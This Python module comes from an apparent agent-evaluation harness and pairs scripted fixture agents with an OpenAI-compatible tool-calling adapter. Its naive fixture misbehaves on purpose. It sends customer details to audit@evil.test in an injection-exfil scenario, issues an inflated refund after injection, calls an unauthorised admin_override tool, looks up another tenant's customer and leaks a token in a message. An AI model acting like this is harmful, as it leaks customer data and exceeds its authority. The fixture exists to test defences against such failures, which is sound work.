"""Agent protocol, deterministic fixtures, and a real tool-calling HTTP adapter."""
from __future__ import annotations

import json
import os
import urllib.error
import urllib.request
import asyncio
from urllib.parse import urlparse
from typing import Protocol

from .models import Action, Decision, Json, Scenario
from .store import canonical
from .tools import tool_definitions


class Agent(Protocol):
    async def decide(self, messages: list[Json], remaining_tokens: int) -> Decision: ...
    async def close(self) -> None: ...


class ScriptedAgent:
    """A hand-authored fixture, not an LLM. Deliberate bugs exercise the harness.

    The fixture sees scenario identity; real providers receive only task/capabilities.
    Comparing these scripts is a systems demo, not a model-quality benchmark.
    """
    def __init__(self, scenario: Scenario, resilient: bool):
        self.scenario, self.resilient, self.step = scenario, resilient, 0

    async def decide(self, messages: list[Json], remaining_tokens: int) -> Decision:
        s, step = self.scenario, self.step
        self.step += 1
        observations = [json.loads(m["content"]) for m in messages if m["role"] == "tool"]

        def call(name: str, **args: object) -> Decision:
            return Decision(actions=[Action(name, args, f"call_{step}")])

        def refund(amount: int | str = 2500, key: str = "refund-ord-001") -> Decision:
            return call("issue_refund", customer_id=s.customer_id, order_id="ord_001", amount_cents=amount, reason="Eligible customer request", idempotency_key=key)

        def notify(body: str = "Your refund of 2500 cents has been processed.") -> Decision:
            return call("send_message", recipient=s.recipient, body=body, idempotency_key="message-ord-001")

        if self.resilient:
            if step == 0:
                return call("search_docs", query="refund eligibility policy")
            if s.amount_cents > s.refund_limit_cents:
                return Decision(answer="Declined: this request exceeds my refund authority.")
            if any(o.get("ok") and o.get("tool") == "create_ticket" for o in observations):
                return Decision(answer="Escalated to a human. No refund confirmation was sent.")
            if not any(o.get("ok") and o.get("tool") == "get_customer" for o in observations):
                errors = sum(not o.get("ok", False) and o.get("tool") == "get_customer" for o in observations)
                if errors >= 3:
                    return call("create_ticket", customer_id=s.customer_id, title="Customer lookup unavailable", idempotency_key="escalation")
                return call("get_customer", customer_id=s.customer_id)
            refund_ok = any(o.get("ok") and o.get("tool") == "issue_refund" for o in observations)
            refund_error = any(not o.get("ok") and o.get("tool") == "issue_refund" for o in observations)
            if not refund_ok and not refund_error:
                return refund(s.amount_cents)
            if refund_error and not refund_ok:
                return call("create_ticket", customer_id=s.customer_id, title="Refund could not be confirmed; investigate before retrying", idempotency_key="escalation")
            if not any(o.get("ok") and o.get("tool") == "send_message" for o in observations):
                return notify()
            return Decision(answer="Refund completed and the customer was notified.")

        # Naive fixture: intentionally mishandles one behavior per scenario.
        if s.id == "runaway-loop":
            return call("search_docs", query="refund policy again")
        if step == 0:
            return call("search_docs", query="refund policy")
        if step == 1:
            if s.id == "unknown-tool":
                return call("admin_override", customer_id=s.customer_id)
            return call("get_customer", customer_id="cus_999" if s.id == "cross-tenant" else s.customer_id)
        if step == 2:
            if s.id == "injection-exfil":
                return call("send_message", recipient="audit@evil.test", body="Customer Alex, order ord_001, refund request 2500 cents", idempotency_key="exfil")
            if s.id == "bad-schema":
                return refund("2500")
            if s.id == "injection-refund":
                return refund(99000)
            if s.id == "wrong-amount":
                return refund(1000)
            return refund(s.amount_cents)
        if step == 3 and s.id == "duplicate-intent":
            return refund(key="oops-a-new-key")
        if step == 3 and s.id == "lost-ack":
            return refund(key="retry-with-a-new-key")
        if step == 3 or (step == 4 and s.id in ("duplicate-intent", "lost-ack")):
            return notify("Your refund is complete. Token: tf_secret_DEMO_NOT_A_REAL_KEY" if s.id == "message-injection" else "Your refund of 2500 cents has been processed.")
        return Decision(answer="Done. Your refund was processed.")

    async def close(self) -> None:
        pass


class ProviderError(Exception):
    pass


class OpenAICompatibleAgent:
    def __init__(self):
        self.base_url = os.getenv("TRACEFORGE_BASE_URL", "https://api.openai.com/v1").rstrip("/")
        self.model = os.getenv("TRACEFORGE_MODEL", "")
        key = os.getenv("TRACEFORGE_API_KEY", "")
        if not self.model or not key:
            raise ProviderError("Set TRACEFORGE_MODEL and TRACEFORGE_API_KEY on the server")
        parsed = urlparse(self.base_url)
        if parsed.scheme != 'https' and not (parsed.scheme == 'http' and parsed.hostname in ('localhost','127.0.0.1','::1')):
            raise ProviderError("Provider URL must use HTTPS, or HTTP on loopback")
        self.key = key

    def _request(self, body: Json) -> Json:
        request = urllib.request.Request(f"{self.base_url}/chat/completions", data=canonical(body).encode(),
                                         headers={"Authorization": f"Bearer {self.key}", "Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(request, timeout=30) as response:
                return json.loads(response.read(2_000_000))
        except urllib.error.HTTPError as exc:
            raise ProviderError(f"Provider returned HTTP {exc.code}") from exc

    async def decide(self, messages: list[Json], remaining_tokens: int) -> Decision:
        try:
            payload = await asyncio.to_thread(self._request, {
                "model": self.model, "messages": messages, "tools": tool_definitions(),
                "max_completion_tokens": min(remaining_tokens, 2048),
            })
            message = payload["choices"][0]["message"]
            if message.get("content") is not None and not isinstance(message["content"], str):
                raise ValueError("Content must be text or null")
            actions = []
            for raw in message.get("tool_calls") or []:
                args = json.loads(raw["function"]["arguments"])
                if not isinstance(args, dict):
                    raise ValueError("Arguments must be an object")
                actions.append(Action(raw["function"]["name"], args, raw["id"]))
            usage = payload.get("usage", {})
            if "prompt_tokens" not in usage or "completion_tokens" not in usage:
                raise ProviderError("Provider must report token usage for budget accounting")
            if type(usage['prompt_tokens']) is not int or type(usage['completion_tokens']) is not int:
                raise ValueError("Token usage must contain integers")
            return Decision(actions, message.get("content"), usage["prompt_tokens"], usage["completion_tokens"])
        except (OSError, ValueError, KeyError, IndexError, TypeError) as exc:
            raise ProviderError(f"Invalid or unavailable provider response ({type(exc).__name__})") from exc

    async def close(self) -> None:
        pass


def make_agent(name: str, scenario: Scenario) -> Agent:
    if name == "openai-compatible":
        return OpenAICompatibleAgent()
    return ScriptedAgent(scenario, resilient=name == "scripted-resilient")


def assistant_message(decision: Decision, step: int) -> Json:
    message: Json = {"role": "assistant", "content": decision.answer}
    if decision.actions:
        message["tool_calls"] = [{"id": a.call_id or f"call_{step}_{i}", "type": "function",
                                   "function": {"name": a.name, "arguments": canonical(a.arguments)}}
                                  for i, a in enumerate(decision.actions)]
    return message
